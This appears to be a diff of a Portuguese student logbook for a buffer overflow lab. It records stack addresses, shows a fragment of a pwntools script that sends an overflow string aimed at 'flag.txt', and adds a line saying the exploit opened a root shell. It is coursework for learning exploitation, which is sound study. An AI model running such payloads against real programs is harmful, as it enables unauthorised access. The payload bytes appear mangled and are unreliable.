@@ -27,7 +27,7 @@ Ficheiros gerados:
 - valor do ebp: 0xffffca68
 - endereço do buffer: 0xffffc9fc
 
-![Alt text](uploads/logbook5P4.1.png)
+![Alt text](uploads/logbook5P4.png)
 
 ### Task3.2 - Launching the Attack
 <div align="justify">
@@ -203,4 +203,8 @@ r.recvuntil(b":")
 r.sendline("abcabcabcabcabcabcabcabcabcabcab$#üþflag.txt")
 r.interactive()
 ```
+
+Por fim executamos o programa o que provocou buffer overflow e abriu-nos uma root shell.
+
+![Alt text](uploads/logbook5P6.png)
 </div>
